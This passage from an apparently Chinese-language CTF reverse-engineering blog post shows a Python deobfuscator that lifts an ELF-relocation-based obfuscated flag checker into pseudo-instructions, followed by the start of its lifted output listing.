class="string">&#x27;dst&#x27;</span>, <span class="string">&#x27;code&#x27;</span>, <span class="string">&#x27;ridx&#x27;</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">lift_shellcode</span>(<span class="params">instructions</span>):</span><br><span class="line">    idx = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> idx &lt; <span class="built_in">len</span>(instructions):</span><br><span class="line">        match instructions[idx:idx+<span class="number">6</span>]:</span><br><span class="line">            case [</span><br><span class="line">                ArraySlots(values, ridx),</span><br><span class="line">                Mov(Symbol(<span class="number">3</span>), Ref(RelocAddr(Reloc(rel2), <span class="string">&#x27;r_address&#x27;</span>)), _, _),</span><br><span class="line">                Mov(SymAddr(Symbol(<span class="number">3</span>), <span class="string">&#x27;st_name&#x27;</span>), _, _, _),</span><br><span class="line">                Add(dst, Symbol(<span class="number">3</span>), _, _),</span><br><span class="line">                Mov(Symbol(<span class="number">2</span>), _, _, _),</span><br><span class="line">                Mov(RelocAddr(Reloc(rel6), <span class="string">&#x27;r_address&#x27;</span>), Symbol(<span class="number">2</span>), _, _)</span><br><span class="line">            ] <span class="keyword">if</span> (rel2 == ridx) <span class="keyword">and</span> (rel6 == ridx):</span><br><span class="line">                instructions[idx:idx+<span class="number">6</span>] = [</span><br><span class="line">                    Shellcode(dst, <span class="string">b&#x27;&#x27;</span>.join([(x &amp; <span class="number">0xffffffffffffffff</span>).to_bytes(<span class="number">8</span>, <span class="string">&#x27;little&#x27;</span>) <span class="keyword">for</span> x <span class="keyword">in</span> values]), ridx)</span><br><span class="line">                ]</span><br><span class="line">        idx += <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> instructions</span><br><span class="line"></span><br><span class="line">Aop = namedtuple(<span class="string">&#x27;aop&#x27;</span>, [<span class="string">&#x27;dst&#x27;</span>, <span class="string">&#x27;op&#x27;</span>, <span class="string">&#x27;val&#x27;</span>, <span class="string">&#x27;k&#x27;</span>, <span class="string">&#x27;ridx&#x27;</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">lift_aop</span>(<span class="params">instructions</span>):</span><br><span class="line">    idx = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> idx &lt; <span class="built_in">len</span>(instructions):</span><br><span class="line">        match instructions[idx:idx+<span class="number">5</span>]:</span><br><span class="line">            case [</span><br><span class="line">                Mov(Symbol(<span class="number">2</span>), val, _, ridx),</span><br><span class="line">                Mov(Symbol(<span class="number">5</span>), Symbol(<span class="number">2</span>), _, _),</span><br><span class="line">                Shellcode(_, data, _),</span><br><span class="line">                Mov(Symbol(<span class="number">2</span>), Ref(Symbol(<span class="number">5</span>)), _, _),</span><br><span class="line">                Add(dst, dst2, Symbol(<span class="number">2</span>), _)</span><br><span class="line">            ] <span class="keyword">if</span> <span class="built_in">len</span>(data) == <span class="number">24</span> <span class="keyword">and</span> (dst == dst2):</span><br><span class="line">                op = <span class="built_in">next</span>(md.disasm(data, <span class="number">0</span>))</span><br><span class="line"></span><br><span class="line">                t = op.mnemonic</span><br><span class="line">                k = <span class="built_in">int</span>(op.op_str.split(<span class="string">&#x27;, &#x27;</span>)[-<span class="number">1</span>], <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">                instructions[idx:idx+<span class="number">5</span>] = [</span><br><span class="line">                    Aop(dst, t, val, k, ridx)</span><br><span class="line">                ]</span><br><span class="line"></span><br><span class="line">        idx += <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> instructions</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dump</span>(<span class="params">instructions</span>):</span><br><span class="line">    <span class="keyword">for</span> op <span class="keyword">in</span> instructions:</span><br><span class="line">        match op:</span><br><span class="line">            case Mov(SymAddr(sym, <span class="string">&#x27;st_name&#x27;</span>), Ref(val), <span class="number">8</span>, ridx) <span class="keyword">if</span> <span class="built_in">type</span>(val) <span class="keyword">is</span> <span class="built_in">int</span>:</span><br><span class="line">                name = val &amp; <span class="number">0xffffffff</span></span><br><span class="line">                info = (val &gt;&gt; <span class="number">4</span>) &amp; <span class="number">0xff</span></span><br><span class="line">                other = (val &gt;&gt; <span class="number">5</span>) &amp; <span class="number">0xff</span></span><br><span class="line">                shndx = (val &gt;&gt; <span class="number">6</span>) &amp; <span class="number">0xffff</span></span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&#x27;[<span class="subst">&#123;ridx:04d&#125;</span>] :: setinfo <span class="subst">&#123;sym&#125;</span>, name=0x<span class="subst">&#123;name:x&#125;</span>, info=0x<span class="subst">&#123;info:x&#125;</span>, other=0x<span class="subst">&#123;other:x&#125;</span>, shndx=0x<span class="subst">&#123;shndx:x&#125;</span>&#x27;</span>)</span><br><span class="line">            case Mov(BaseAddr(), Ref(<span class="number">0</span>), _, ridx):</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&#x27;[<span class="subst">&#123;ridx:04d&#125;</span>] :: [ARRAY SLOT]&#x27;</span>)</span><br><span class="line">            case Mov(dst, src, <span class="number">8</span>, ridx):</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&#x27;[<span class="subst">&#123;ridx:04d&#125;</span>] :: mov <span class="subst">&#123;dst&#125;</span>, <span class="subst">&#123;src&#125;</span>&#x27;</span>)</span><br><span class="line">            case Mov(dst, src, sz, ridx):</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&#x27;[<span class="subst">&#123;ridx:04d&#125;</span>] :: mov(<span class="subst">&#123;sz&#125;</span>) <span class="subst">&#123;dst&#125;</span>, <span class="subst">&#123;src&#125;</span>&#x27;</span>)</span><br><span class="line">            case Add(dst, src, add, ridx):</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&#x27;[<span class="subst">&#123;ridx:04d&#125;</span>] :: add <span class="subst">&#123;dst&#125;</span>, <span class="subst">&#123;src&#125;</span>, <span class="subst">&#123;add&#125;</span>&#x27;</span>)</span><br><span class="line">            case R32(dst, src, add, ridx):</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&#x27;[<span class="subst">&#123;ridx:04d&#125;</span>] :: r32 <span class="subst">&#123;dst&#125;</span>, <span class="subst">&#123;src&#125;</span>, <span class="subst">&#123;add&#125;</span>&#x27;</span>)</span><br><span class="line">            case Block(arr, flag, ridx):</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&#x27;[<span class="subst">&#123;ridx:04d&#125;</span>] :: shuffle <span class="subst">&#123;arr&#125;</span>, <span class="subst">&#123;flag&#125;</span>&#x27;</span>)</span><br><span class="line">            case Output(out, arr, ridx):</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&#x27;[<span class="subst">&#123;ridx:04d&#125;</span>] :: output <span class="subst">&#123;out&#125;</span>, <span class="subst">&#123;arr&#125;</span>&#x27;</span>)</span><br><span class="line">            case ShuffleBlock(f1, f2, ridx):</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&#x27;[<span class="subst">&#123;ridx:04d&#125;</span>] :: shuffleblock <span class="subst">&#123;f1&#125;</span>, <span class="subst">&#123;f2&#125;</span>&#x27;</span>)</span><br><span class="line">            case MultAdd(dst, val, k, ridx):</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&#x27;[<span class="subst">&#123;ridx:04d&#125;</span>] :: madd <span class="subst">&#123;dst&#125;</span> += (<span class="subst">&#123;val&#125;</span> * <span class="subst">&#123;k&#125;</span>)&#x27;</span>)</span><br><span class="line">            case Aop(dst, op, val, k, ridx):</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&#x27;[<span class="subst">&#123;ridx:04d&#125;</span>] :: aop <span class="subst">&#123;dst&#125;</span> += (<span class="subst">&#123;val&#125;</span> <span class="subst">&#123;op&#125;</span> <span class="subst">&#123;k&#125;</span>)&#x27;</span>)</span><br><span class="line">            case Reset(ridx):</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&#x27;[<span class="subst">&#123;ridx:04d&#125;</span>] :: reset&#x27;</span>)</span><br><span class="line">            case Trunc(val, k, ridx):</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&#x27;[<span class="subst">&#123;ridx:04d&#125;</span>] :: trunc <span class="subst">&#123;val&#125;</span> &amp;= 0x<span class="subst">&#123;k:x&#125;</span>&#x27;</span>)</span><br><span class="line">            case ArraySlots(values, ridx):</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&#x27;[<span class="subst">&#123;ridx:04d&#125;</span>] :: array [<span class="subst">&#123;<span class="string">&quot;, &quot;</span>.join([<span class="built_in">hex</span>(x) <span class="keyword">for</span> x <span class="keyword">in</span> values])&#125;</span>]&#x27;</span>)</span><br><span class="line">            case Shellcode(dst, code, ridx):</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&#x27;[<span class="subst">&#123;ridx:04d&#125;</span>] :: exec <span class="subst">&#123;dst&#125;</span> &lt;- <span class="subst">&#123;code.<span class="built_in">hex</span>()&#125;</span>&#x27;</span>)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;-&#x27;</span> * <span class="number">20</span>)</span><br><span class="line">                <span class="keyword">for</span> i <span class="keyword">in</span> md.disasm(code, <span class="number">0</span>):</span><br><span class="line">                    <span class="keyword">if</span> i.mnemonic == <span class="string">&#x27;ret&#x27;</span>:</span><br><span class="line">                        <span class="keyword">break</span></span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&quot;    0x%x:\t%s\t%s&quot;</span> %(i.address, i.mnemonic, i.op_str.replace(<span class="string">&#x27;0x8040e4&#x27;</span>, <span class="string">&#x27;s5&#x27;</span>).replace(<span class="string">&#x27;0x8040cc&#x27;</span>, <span class="string">&#x27;s4&#x27;</span>)))</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;-&#x27;</span> * <span class="number">20</span>)</span><br><span class="line">            case _:</span><br><span class="line">                <span class="built_in">print</span>(op)</span><br><span class="line"></span><br><span class="line">LIFTS = [</span><br><span class="line">    lift_mov_add,</span><br><span class="line">    remove_sizes,</span><br><span class="line">    lift_indirect,</span><br><span class="line">    lift_block,</span><br><span class="line">    lift_reset,</span><br><span class="line">    lift_shuffle_block,</span><br><span class="line">    lift_output,</span><br><span class="line">    lift_multadd,</span><br><span class="line">    lift_truncate,</span><br><span class="line">    lift_array_slots,</span><br><span class="line">    lift_shellcode,</span><br><span class="line">    lift_aop,</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">lift</span>(<span class="params">instructions</span>):</span><br><span class="line">    <span class="keyword">for</span> lift_fn <span class="keyword">in</span> LIFTS:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;[*] <span class="subst">&#123;lift_fn.__name__&#125;</span>...&#x27;</span>)</span><br><span class="line">        instructions = lift_fn(instructions)</span><br><span class="line">    <span class="keyword">return</span> instructions</span><br><span class="line"></span><br><span class="line">instructions = parse(b)</span><br><span class="line">instructions = lift(instructions)</span><br><span class="line">dump(instructions)</span><br></pre></td></tr></table></figure><p>得到：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br><span class="line">551</span><br><span class="line">552</span><br><span class="line">553</span><br><span class="line">554</span><br><span class="line">555</span><br><span class="line">556</span><br><span class="line">557</span><br><span class="line">558</span><br><span class="line">559</span><br><span class="line">560</span><br><span class="line">561</span><br><span class="line">562</span><br><span class="line">563</span><br><span class="line">564</span><br><span class="line">565</span><br><span class="line">566</span><br><span class="line">567</span><br><span class="line">568</span><br><span class="line">569</span><br><span class="line">570</span><br><span class="line">571</span><br><span class="line">572</span><br><span class="line">573</span><br><span class="line">574</span><br><span class="line">575</span><br><span class="line">576</span><br><span class="line">577</span><br><span class="line">578</span><br><span class="line">579</span><br><span class="line">580</span><br><span class="line">581</span><br><span class="line">582</span><br><span class="line">583</span><br><span class="line">584</span><br><span class="line">585</span><br><span class="line">586</span><br><span class="line">587</span><br><span class="line">588</span><br><span class="line">589</span><br><span class="line">590</span><br><span class="line">591</span><br><span class="line">592</span><br><span class="line">593</span><br><span class="line">594</span><br><span class="line">595</span><br><span class="line">596</span><br><span class="line">597</span><br><span class="line">598</span><br><span class="line">599</span><br><span class="line">600</span><br><span class="line">601</span><br><span class="line">602</span><br><span class="line">603</span><br><span class="line">604</span><br><span class="line">605</span><br><span class="line">606</span><br><span class="line">607</span><br><span class="line">608</span><br><span class="line">609</span><br><span class="line">610</span><br><span class="line">611</span><br><span class="line">612</span><br><span class="line">613</span><br><span class="line">614</span><br><span class="line">615</span><br><span class="line">616</span><br><span class="line">617</span><br><span class="line">618</span><br><span class="line">619</span><br><span class="line">620</span><br><span class="line">621</span><br><span class="line">622</span><br><span class="line">623</span><br><span class="line">624</span><br><span class="line">625</span><br><span class="line">626</span><br><span class="line">627</span><br><span class="line">628</span><br><span class="line">629</span><br><span class="line">630</span><br><span class="line">631</span><br><span class="line">632</span><br><span class="line">633</span><br><span class="line">634</span><br><span class="line">635</span><br><span class="line">636</span><br><span class="line">637</span><br><span class="line">638</span><br><span class="line">639</span><br><span class="line">640</span><br><span class="line">641</span><br><span class="line">642</span><br><span class="line">643</span><br><span class="line">644</span><br><span class="line">645</span><br><span class="line">646</span><br><span class="line">647</span><br><span class="line">648</span><br><span class="line">649</span><br><span class="line">650</span><br><span class="line">651</span><br><span class="line">652</span><br><span class="line">653</span><br><span class="line">654</span><br><span class="line">655</span><br><span class="line">656</span><br><span class="line">657</span><br><span class="line">658</span><br><span class="line">659</span><br><span class="line">660</span><br><span class="line">661</span><br><span class="line">662</span><br><span class="line">663</span><br><span class="line">664</span><br><span class="line">665</span><br><span class="line">666</span><br><span class="line">667</span><br><span class="line">668</span><br><span class="line">669</span><br><span class="line">670</span><br><span class="line">671</span><br><span class="line">672</span><br><span class="line">673</span><br><span class="line">674</span><br><span class="line">675</span><br><span class="line">676</span><br><span class="line">677</span><br><span class="line">678</span><br><span class="line">679</span><br><span class="line">680</span><br><span class="line">681</span><br><span class="line">682</span><br><span class="line">683</span><br><span class="line">684</span><br><span class="line">685</span><br><span class="line">686</span><br><span class="line">687</span><br><span class="line">688</span><br><span class="line">689</span><br><span class="line">690</span><br><span class="line">691</span><br><span class="line">692</span><br><span class="line">693</span><br><span class="line">694</span><br><span class="line">695</span><br><span class="line">696</span><br><span class="line">697</span><br><span class="line">698</span><br><span class="line">699</span><br><span class="line">700</span><br><span class="line">701</span><br><span class="line">702</span><br><span class="line">703</span><br><span class="line">704</span><br><span class="line">705</span><br><span class="line">706</span><br><span class="line">707</span><br><span class="line">708</span><br><span class="line">709</span><br><span class="line">710</span><br><span class="line">711</span><br><span class="line">712</span><br><span class="line">713</span><br><span class="line">714</span><br><span class="line">715</span><br><span class="line">716</span><br><span class="line">717</span><br><span class="line">718</span><br><span class="line">719</span><br><span class="line">720</span><br><span class="line">721</span><br><span class="line">722</span><br><span class="line">723</span><br><span class="line">724</span><br><span class="line">725</span><br><span class="line">726</span><br><span class="line">727</span><br><span class="line">728</span><br><span class="line">729</span><br><span class="line">730</span><br><span class="line">731</span><br><span class="line">732</span><br><span class="line">733</span><br><span class="line">734</span><br><span class="line">735</span><br><span class="line">736</span><br><span class="line">737</span><br><span class="line">738</span><br><span class="line">739</span><br><span class="line">740</span><br><span class="line">741</span><br><span class="line">742</span><br><span class="line">743</span><br><span class="line">744</span><br><span class="line">745</span><br><span class="line">746</span><br><span class="line">747</span><br><span class="line">748</span><br><span class="line">749</span><br><span class="line">750</span><br><span class="line">751</span><br><span class="line">752</span><br><span class="line">753</span><br><span class="line">754</span><br><span class="line">755</span><br><span class="line">756</span><br><span class="line">757</span><br></pre></td><td class="code"><pre><span class="line">[<span class="number">0005</span>] :: mov s2, &amp;flag[<span class="number">0</span>]</span><br><span class="line">[<span class="number">0007</span>] :: <span class="built_in">mov</span>(<span class="number">1</span>) s4, s2</span><br><span class="line">[<span class="number">0008</span>] :: [ARRAY SLOT]</span><br><span class="line">[<span class="number">0009</span>] :: mov arr[<span class="number">15</span>], &amp;<span class="number">1585408084625667200</span></span><br><span class="line">[<span class="number">0010</span>] :: mov arr[<span class="number">16</span>], &amp;<span class="number">195</span></span><br><span class="line">[<span class="number">0011</span>] :: mov s3, &amp;arr[<span class="number">15</span>]</span><br><span class="line">[<span class="number">0012</span>] :: setinfo s3, name=<span class="number">0x1a</span>, info=<span class="number">0x1</span>, other=<span class="number">0x0</span>, shndx=<span class="number">0x0</span></span><br><span class="line">[<span class="number">0013</span>] :: add arr[<span class="number">15</span>], s3, <span class="number">0</span></span><br><span class="line">[<span class="number">0014</span>] :: mov s2, &amp;r101002.r_address</span><br><span class="line">[<span class="number">0016</span>] :: <span class="built_in">mov</span>(<span class="number">24</span>) arr[<span class="number">15</span>], s2</span><br><span class="line">[<span class="number">0017</span>] :: [ARRAY SLOT]</span><br><span class="line">[<span class="number">0018</span>] :: mov arr[<span class="number">42</span>], &amp;<span class="number">141015791240320</span></span><br><span class="line">[<span class="number">0019</span>] :: mov arr[<span class="number">43</span>], &amp;<span class="number">195</span></span><br><span class="line">[<span class="number">0020</span>] :: mov s3, &amp;arr[<span class="number">42</span>]</span><br><span class="line">[<span class="number">0021</span>] :: setinfo s3, name=<span class="number">0x1a</span>, info=<span class="number">0x1</span>, other=<span class="number">0x0</span>, shndx=<span class="number">0x0</span></span><br><span class="line">[<span class="number">0022</span>] :: add arr[<span class="number">42</span>], s3, <span class="number">0</span></span><br><span class="line">[<span class="number">0023</span>] :: mov arr[<span class="number">42</span>], s2</span><br><span class="line">[<span class="number">0024</span>] :: mov s2, &amp;s4</span><br><span class="line">[<span class="number">0026</span>] :: <span class="built_in">mov</span>(<span 